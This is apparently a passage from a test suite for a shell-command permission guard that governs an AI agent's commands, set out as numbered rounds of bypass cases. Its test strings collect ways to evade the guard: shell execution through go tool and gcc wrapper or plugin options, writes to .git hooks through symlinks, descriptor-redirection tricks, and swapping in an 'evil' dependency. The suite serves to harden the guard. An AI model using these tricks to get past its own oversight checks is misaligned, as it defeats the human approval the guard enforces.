      const s = new SessionState(repo);
      const wrote = await effect(writer, s);
      assert.ok(wrote !== "allow" || (await effect(`npm test -- ${b}/x.test.js`, s)) !== "allow", writer);
    }
    fs.mkdirSync(path.join(b, "p"));
    fs.writeFileSync(path.join(b, "p", "package.json"), "{}");
    const f = new SessionState(repo);
    await effect(`xz -d --files=${b}/list`, f);
    assert.notEqual((await decideShell(guard, f, path.join(b, "p"), "npm test")).effect, "allow", "xz --files");
    fs.mkdirSync(path.join(b, "e", "sub"), { recursive: true });
    fs.mkdirSync(path.join(b, "k", "deep"), { recursive: true });
    const l = new SessionState(repo);
    await effect(`patch -d ${b}/k/deep -p1 -i ${b}/p.diff && printf x > ${b}/k/deep/l/x.test.js`, l);
    assert.notEqual(await effect(`npm test -- ${b}/e/sub/x.test.js`, l), "allow", "patch");
  } finally {
    fs.rmSync(b, { recursive: true, force: true });
  }
  for (const c of [`echo "$$(echo "c")"`, `echo "$\${x"y z"}"`, `echo "$$(echo "; echo INJECTED; ")"`, `echo "$\\\n$(echo "c")"`]) assert.ok("ask" in canonical(c), c);
  for (const c of [`echo "$$"`, `echo "$$ x"`, `echo "$x(y)"`]) assert.ok(!("ask" in canonical(c)), c);
});

// ---- round 15 ----

test("round 15: an approved call the model judges marks every writable root; the link rule covers unlisted writes", async () => {
  const b = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-r15-")));
  try {
    fs.writeFileSync(path.join(b, "package.json"), "{}");
    const s = new SessionState(repo);
    const d = await decideShell(guard, s, repo, `python3 -c "open('${b}/package.json','w').write('{}')"`);
    assert.notEqual(d.effect, "allow");
    d.approve?.();
    assert.notEqual(await effect(`cd ${b} && npm test`, s), "allow", "after an approved model call");
    fs.mkdirSync(path.join(b, "stage"));
    fs.mkdirSync(path.join(b, "target"));
    const l = new SessionState(repo);
    await effect(`patch -d${b}/stage -p1 -i${b}/p.diff && gzip -d ${b}/stage/l/x.test.js.gz`, l);
    assert.notEqual(await effect(`npm test -- ${b}/target/x.test.js`, l), "allow", "an unlisted write through a link patch made");
  } finally {
    fs.rmSync(b, { recursive: true, force: true });
  }
});

// ---- round 16 ----

test("round 16: an approved rule ask beside code the checks do not read marks every writable root", async () => {
  for (const c of [`git push origin main; python3 -c "open('t.test.js','w').write('x')"`, "python3 gen_tests.py && git push", "sudo true; python3 -c \"open('t.test.js','w')\"", "git push origin main; bash ./gen.sh"]) {
    const s = new SessionState(repo);
    const d = await decideShell(guard, s, repo, c);
    assert.equal(d.effect, "ask", c);
    d.approve?.();
    assert.notEqual(await effect("npm test", s), "allow", c);
  }
});

test("round 16: a tee fed from a copied descriptor, npm pack of a git spec", async () => {
  for (const c of [`{ npm test -s | tee x.test.js <&3 ; } <<< 'code' 3>&0`, `printf code | { npm test -s | tee x.test.js <&3; } 3>&0`, `{ npm test | cat <&3 | tee x.test.js; } <<< code 3>&0`]) {
    assert.notEqual(await effect(c), "allow", c);
  }
  for (const c of ["npm pack github:u/r", "npm pack git+https://example.com/r.git", "npm pack u/r", "npm pack git://example.com/r", "npm pack https://example.com/r.tgz"]) assert.equal(await effect(c), "ask", c);
  for (const c of ["npm pack", "npm pack --dry-run", "npm test 2>&1 | tee test.log"]) assert.equal(await effect(c), "allow", c);
});

// ---- round 17 ----

test("round 17: fd 0 in any spelling before a tee; npm pack passes only a registry name or a local path", async () => {
  for (const c of [`{ npm test -s | tee x.test.js 0>&3; } <<< 'echo hi' 3>&00`, `{ npm test -s | tee x.test.js 0>&3; } <<< 'echo hi' 3>&0`, `{ npm test -s | tee x.test.js <&3; } <<< hi 3>& 0`]) {
    assert.notEqual(await effect(c), "allow", c);
  }
  for (const c of ["npm pack foo@git+https://example.com/r", "npm pack git@github.com:u/r", "npm pack GIT+https://example.com/r", "npm pack GITHUB:u/r", "npm pack x@u/r", "npm pack a@b.c:d", "pnpm pack git@github.com:u/r"]) assert.equal(await effect(c), "ask", c);
  for (const c of ["npm pack lodash", "npm pack lodash@4.17.21", "npm pack @scope/pkg@^1.0.0", "npm pack ./dir", "npm pack", "npm test 2>&1 | tee test.log"]) assert.equal(await effect(c), "allow", c);
});

test("round 18: npm view and info of a non-registry spec ask", async () => {
  const sha = "0123456789abcdef0123456789abcdef01234567";
  for (const c of [`npm view github:u/r#${sha}`, `npm info u/r#${sha} name`, `npm view git+ssh://git@github.com/u/r.git#${sha}`, `pnpm view gitlab:u/r#${sha}`]) assert.equal(await effect(c), "ask", c);
  for (const c of ["npm view lodash", "npm info lodash version", "npm view @scope/pkg dist.tarball"]) assert.equal(await effect(c), "allow", c);
});

test("round 19: an escaped \\ before a line end keeps a later \$( escaped; npm show; view's field words; npm pack .", async () => {
  const run = (t: string, cwd: string) => spawnSync("bash", ["-c", t], { cwd, encoding: "utf8" }).stdout;
  const d = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-r19-")));
  try {
    for (const c of ["cat <<E\n$\\\\\n\\$(touch f)\nE", 'echo "$\\\\\n$HOME"', "cat <<E\n$\\\\\nx\nE"]) {
      const printed = canonical(c);
      if ("ask" in printed) continue;
      fs.rmSync(path.join(d, "f"), { force: true });
      assert.equal(run(printed.text!, d), run(c, d), c);
      assert.equal(fs.existsSync(path.join(d, "f")), false, c);
    }
  } finally {
    fs.rmSync(d, { recursive: true, force: true });
  }
  assert.ok("ask" in canonical('echo "$\\\n$(echo "c")"'), "a $ before a line continuation still asks");
  for (const c of ["npm show github:u/r", "npm v u/r"]) assert.equal(await effect(c), "ask", c);
  for (const c of ["npm view lodash 'versions[0]'", "npm pack .", "npm pack ..", "npm view ."]) assert.equal(await effect(c), "allow", c);
});

// ---- round 20 ----

test("round 20: an option's value before npm's subcommand or package; gcc -fcompare-debug=-fplugin", async () => {
  const sha = "0123456789abcdef0123456789abcdef01234567";
  for (const c of ["npm --loglevel info pack git+file:///tmp/x/pkg", "npm --prefix info pack github:u/r", "npm -w v pack github:u/r", "npm --prefix view pack github:u/r", "pnpm --filter v pack github:u/r", "yarn --cwd v pack github:u/r", `npm view --loglevel silent github:u/r#${sha}`, "npm view -w a github:u/r", "npm view --tag latest github:u/r", "npm info --color false github:u/r", `npm --loglevel info view github:u/r#${sha}`]) {
    assert.equal(await effect(c), "ask", c);
  }
  for (const c of ["npm view lodash 'versions[0]'", "npm view --json lodash dist.tarball", "npm view left-pad versions"]) assert.equal(await effect(c), "allow", c);
  for (const c of ["gcc -fcompare-debug=-fplugin=./x.so -c t.c", "ccache gcc -fcompare-debug=-fplugin=./x.so -c t.c", "clang -cc1 -load ./x.so t.c"]) assert.equal(await effect(c), "ask", c);
  assert.notEqual(await effect("gcc -fcompare-debug=-O2 -c t.c -o t.o"), "ask");
  assert.ok("ask" in canonical('echo "$\\\n$(echo "c")"'), "a $ before a line continuation still asks, as $$(");
});

// ---- round 21 ----

test("round 21: -fcompare-debug= passes only plain option words; npm field words hold no glob", async () => {
  for (const c of ["gcc '-fcompare-debug=%{!nosuch:-wrapper} /bin/sh,-c,echo${IFS}hi' -c t.c -o t.o", "gcc '-fcompare-debug=%:include(x.specs)' -c t.c -o t.o", "gcc '-fcompare-debug=-wrap\\per /tmp/d/w.sh' -c t.c -o t.o", "gcc '-fcompare-debug=\\-B/tmp/d/b/' -c t.c -o t.o", "gcc -fcompare-debug=-fplug%Yin=./x.so -c t.c", "ccache gcc -fcompare-debug=-fplug%Yin=./x.so -c t.c", "g++ -fcompare-debug=-fplug%Zin=./x.so -c t.cc", "cmake -DCMAKE_C_FLAGS=-fcompare-debug=-fplug%Yin=./x.so ."]) {
    assert.equal(await effect(c), "ask", c);
  }
  for (const c of ["gcc -fcompare-debug=-O2 -c t.c -o t.o", "gcc '-fcompare-debug=-gtoggle -O1' -c t.c -o t.o", "gcc -fcompare-debug -c t.c -o t.o"]) assert.notEqual(await effect(c), "ask", c);
  for (const c of ["npm pack '*'", "npm view x '?'", "npm view lodash 'v[a-z]'"]) assert.equal(await effect(c), "ask", c);
  assert.equal(await effect("npm view lodash 'versions[0]'"), "allow");
});

// ---- round 22 ----

test("round 22: unzip -:, npm x@*, an extraction through a link an earlier one left, go tool test2json/cgo/pprof", async () => {
  const b = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-r22-")));
  try {
    const s = new SessionState(repo);
    await effect(`unzip -: ${b}/a.zip -d ${b}/out`, s);
    assert.notEqual(await effect("npm test", s), "allow", "unzip -:");
    fs.mkdirSync(path.join(b, "out"), { recursive: true });
    fs.symlinkSync(repo, path.join(b, "out", "l"));
    const t = new SessionState(repo);
    await effect(`tar -xf ${b}/b.tar -C ${b}/out`, t);
    assert.notEqual(await effect("npm test", t), "allow", "a link an earlier extraction left");
  } finally {
    fs.rmSync(b, { recursive: true, force: true });
  }
  for (const c of ["npm pack x@*", "npm view x@*", "pnpm pack x@*", "go tool test2json git clean -fdx", "go tool test2json -t /bin/sh -c id", "go tool cgo -- -wrapper /bin/sh,-c,id x.go", "go tool pprof -tools=/tmp/x: bin prof"]) {
    assert.notEqual(await effect(c), "allow", c);
  }
  for (const c of ["npm view lodash@^4", "go tool dist list"]) assert.equal(await effect(c), "allow", c);
});

// ---- round 23 ----

test("round 23: unzip clusters with :, go -C tool, an extraction and a second write in one call", async () => {
  const b = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-r23-")));
  try {
    for (const writer of [`unzip -^: ${b}/a.zip -d ${b}/out`, `unzip -q-o: ${b}/a.zip -d ${b}/out`, `unzip -oq-q: ${b}/a.zip -d ${b}/out`, `mkdir -p ${b}/o && tar -xf ${b}/a.tar -C ${b}/o && tar -xf ${b}/b.tar -C ${b}/o`, `unzip -q ${b}/a.zip -d ${b}/o && unzip -q ${b}/b.zip -d ${b}/o`, `tar -xf ${b}/a.tar -C ${b}/o && printf x > ${b}/o/l/x.test.js`]) {
      const s = new SessionState(repo);
      const wrote = await effect(writer, s);
      assert.ok(wrote !== "allow" || (await effect("npm test", s)) !== "allow", writer);
    }
  } finally {
    fs.rmSync(b, { recursive: true, force: true });
  }
  for (const c of ["go -C tool tool test2json /bin/sh -c id", "go -C tool tool cgo -- -wrapper /bin/sh,-c,id x.go", "go -C tool tool pprof -tools=/tmp/x: bin prof"]) assert.notEqual(await effect(c), "allow", c);
});

// ---- round 24 ----

test("round 24: devices by their normalised path; git and mv beside a second write; go tool -C", async () => {
  const b = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-r24-")));
  try {
    for (const writer of [`tar -xf ${b}/a.tar -C ${b}/o2 && printf x > /dev/..${b}/o2/l/x.test.js && rm ${b}/o2/l`, `git -C ${b}/r switch -q withlink && printf x > ${b}/r/l/x.test.js && git -C ${b}/r switch -q main`, `mv ${b}/o ${b}/k && printf x > ${b}/k/l/x.test.js && rm ${b}/k/l`]) {
      const s = new SessionState(repo);
      const wrote = await effect(writer, s);
      assert.ok(wrote !== "allow" || (await effect("npm test", s)) !== "allow", writer);
    }
    fs.mkdirSync(path.join(b, "lo"));
    fs.symlinkSync(path.join(repo, ".git"), path.join(b, "lo", "l"));
    assert.equal(await effect(`printf x > /dev/..${b}/lo/l/hooks/pre-commit`), "ask", "a .git hook through /dev/..");
  } finally {
    fs.rmSync(b, { recursive: true, force: true });
  }
  for (const c of ["go tool -C . test2json /bin/sh -c id", "go tool --C . test2json sh", "go tool -C . cgo -- -wrapper /bin/sh,-c,id x.go"]) assert.notEqual(await effect(c), "allow", c);
  assert.equal(await effect("npm test > /dev/null"), "allow");
});

// ---- round 25 ----

test("round 25: a device only without .., descriptor paths that reopen a file, a writer that runs more than once", async () => {
  const b = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-r25-")));
  try {
    fs.mkdirSync(path.join(b, "t", "a", "b", "c", "d"), { recursive: true });
    fs.symlinkSync(path.join(repo, ".git", "hooks"), path.join(b, "hk"));
    assert.notEqual(await effect(`echo hi > ${b}/hk/../../../dev/null`), "allow", "a .. after a link is no device");
    for (const writer of [`tar -xf ${b}/a.tar -C ${b}/h && printf x > ${b}/h/l/../../../../dev/null`, `for i in 1 2; do tar -xf ${b}/o/a.tar -C ${b}/o; done`, `until tar -xf ${b}/a.tar -C ${b}/o; do :; done`, `unzip -o -q '${b}/z/*.zip' -d ${b}/oz`]) {
      const s = new SessionState(repo);
      const wrote = await effect(writer, s);
      assert.ok(wrote !== "allow" || (await effect("npm test", s)) !== "allow", writer);
    }
  } finally {
    fs.rmSync(b, { recursive: true, force: true });
  }
  for (const c of ["{ printf x > /dev/stdout; } < package.json >&0", "exec < package.json >&0; printf x > /dev/stdout", "{ cp f /dev/stdout; } < package.json >&0", "{ printf x > /dev/stderr; } < package.json 2>&0", "{ printf x > /dev/stdin; } < package.json"]) {
    assert.notEqual(await effect(c), "allow", c);
  }
  for (const c of ["npm test > /dev/null", "npm test 2>/dev/null", "echo hi > /dev/null"]) assert.equal(await effect(c), "allow", c);
});

// ---- round 26 ----

test("round 26: a write through a link to a descriptor, every descriptor write, any function, rsync -a", async () => {
  const b = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-r26-")));
  try {
    fs.symlinkSync("/dev/stdout", path.join(b, "stdout"));
    fs.symlinkSync("/dev/stdin", path.join(b, "in"));
    for (const c of [`{ echo hi > ${b}/stdout; } < package.json >&0`, `printf x < f > ${b}/in`, "echo hi > /dev/./stdin", "echo hi > /dev/stdout; echo hi > /dev/stdin"]) {
      assert.notEqual(await effect(c), "allow", c);
    }
    for (const writer of [`ls() ( tar -xf ${b}/a.tar -C ${b}/o ); ls; ls`, `ls() if :; then tar -xf ${b}/a.tar -C ${b}/o; fi; ls; ls`, `rsync -a /dev/stdin ${b}/l && printf x > ${b}/w`]) {
      const s = new SessionState(repo);
      const wrote = await effect(writer, s);
      assert.ok(wrote !== "allow" || (await effect("npm test", s)) !== "allow", writer);
    }
  } finally {
    fs.rmSync(b, { recursive: true, force: true });
  }
  for (const c of ["npm test > /dev/null", "echo hi > /dev/stdout"]) assert.equal(await effect(c), "allow", c);
});

// ---- round 27 ----

test("round 27: a long chain of links to a descriptor asks", async () => {
  const b = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-r27-")));
  try {
    for (const [n, end] of [[16, "/dev/stdin"], [21, "/dev/stdout"], [39, "/dev/stdin"]] as const) {
      const d = path.join(b, `c${n}`);
      fs.mkdirSync(d);
      fs.symlinkSync(end, path.join(d, `l${n}`));
      for (let i = n - 1; i >= 1; i--) fs.symlinkSync(`l${i + 1}`, path.join(d, `l${i}`));
      assert.notEqual(await effect(`{ printf x > ${d}/l1; } < package.json >&0`), "allow", `${n} links to ${end}`);
      assert.notEqual(await effect(`printf x < package.json > ${d}/l1`), "allow", `${n} links, stdin form`);
    }
  } finally {
    fs.rmSync(b, { recursive: true, force: true });
  }
});

// ---- round 28 ----

test("round 28: a descriptor walk takes .. after a link, tar -M and -L, unzip fed a new name", async () => {
  const b = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-r28-")));
  try {
    fs.symlinkSync("/dev/shm", path.join(b, "hop"));
    fs.symlinkSync("hop/../stdin", path.join(b, "out"));
    for (const c of [`echo hi < package.json > ${b}/out`, `{ printf x > ${b}/hop/../stdout; } < package.json >&0`]) assert.notEqual(await effect(c), "allow", c);
    const s = new SessionState(repo);
    await effect(`printf 'r\\n/test/x.test.js\\n' | unzip -q ${b}/a.zip -d ${b}/out2`, s);
    assert.notEqual(await effect("npm test", s), "allow", "unzip fed a new name");
  } finally {
    fs.rmSync(b, { recursive: true, force: true });
  }
  for (const c of ["printf x | tar -c -M -L 10 -f v.tar big", "tar -cML 10 -f v.tar big", "tar cMLf 10 v.tar big", "tar --multi-volume --tape-length=10 -cf v.tar big", "tar -x -M -f v.tar", "tar -c -L 10 -f v.tar big"]) {
    assert.equal(await effect(c), "ask", c);
  }
  for (const c of ["tar -xf a.tar", "tar czf b.tgz src", "unzip -o a.zip -d sub"]) assert.equal(await effect(c), "allow", c);
});

// ---- round 29 ----

test("round 29: unzip's overwrite mode read as unzip reads it", async () => {
  const b = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-r29-")));
  try {
    for (const u of [`unzip -qo-o ${b}/a.zip -d ${b}/out`, `unzip -qn-n ${b}/a.zip -d ${b}/out`, `unzip -q ${b}/a.zip -d ${b}/out -x -o`, `unzip -q ${b}/a.zip f -o -d ${b}/out`, `unzip -q -Ppassword ${b}/a.zip -d ${b}/out`, `unzip -q -d${b}/out ${b}/a.zip`, `unzip -q -o --o ${b}/a.zip -d ${b}/out`, `unzip -d../out ../a.zip`]) {
      const s = new SessionState(repo);
      const wrote = await effect(`printf 'r\\n/x.test.js\\n' | ${u}`, s);
      assert.ok(wrote !== "allow" || (await effect("npm test", s)) !== "allow", u);
    }
    for (const u of [`unzip -o -q ${b}/a.zip -d ${b}/out`, `unzip -qn ${b}/a.zip -d ${b}/out`]) {
      const s = new SessionState(repo);
      await effect(u, s);
      assert.equal(await effect("npm test", s), "allow", u);
    }
  } finally {
    fs.rmSync(b, { recursive: true, force: true });
  }
});

// ---- round 30 ----

test("round 30: unzip's dashes carry, go mod edit writes go.mod", async () => {
  const b = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-r30-")));
  try {
    for (const o of ["-o--o", "---o", "-q--o", "-n--n", "-- -o", "-q- -o", "-n- -n", "-o -q- -o", "-o- -o"]) {
      const s = new SessionState(repo);
      const wrote = await effect(`printf 'r\\n/x.test.js\\n' | unzip ${o} ${b}/a.zip -d ${b}/out`, s);
      assert.ok(wrote !== "allow" || (await effect("npm test", s)) !== "allow", o);
    }
  } finally {
    fs.rmSync(b, { recursive: true, force: true });
  }
  for (const writer of ["go mod edit -replace example.com/a=example.com/evil@v1.0.0", "go mod edit -require=example.com/x@v1.0.0"]) {
    const s = new SessionState(repo);
    const wrote = await effect(writer, s);
    assert.ok(wrote !== "allow" || (await effect("npm test", s)) !== "allow", writer);
  }
  const t = new SessionState(repo);
  await effect("go mod edit -json", t);
  assert.equal(await effect("npm test", t), "allow", "go mod edit -json writes nothing");
});

// ---- round 31 ----

test("round 31: unzip reads options past a bare - and an x, npm version writes package.json, go -C mod edit", async () => {
  const b = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-r31-")));
  try {
    for (const o of ["-o - --o", "-o -x --o", "-n -x --n", "-ox --o", "-o -qx --o", "-o -x -- -o"]) {
      const s = new SessionState(repo);
      const wrote = await effect(`printf 'r\\n/x.test.js\\n' | unzip ${o} ${b}/a.zip -d ${b}/out`, s);
      assert.ok(wrote !== "allow" || (await effect("npm test", s)) !== "allow", o);
    }
    const ok = new SessionState(repo);
    await effect(`unzip -o -x ${b}/a.zip -d ${b}/out`, ok);
    assert.equal(await effect("npm test", ok), "allow", "-o -x alone never prompts");
  } finally {
    fs.rmSync(b, { recursive: true, force: true });
  }
  for (const writer of ["npm version 1.2.3 --no-git-tag-version", "npm pkg set scripts.test=x", "go -C . mod edit -require=example.com/x@v1.0.0"]) {
    const s = new SessionState(repo);
    const wrote = await effect(writer, s);
    assert.ok(wrote !== "allow" || (await effect("npm test", s)) !== "allow", writer);
  }
  const v = new SessionState(repo);
  await effect("npm version", v);
  assert.equal(await effect("npm test", v), "allow", "npm version alone prints versions");
});
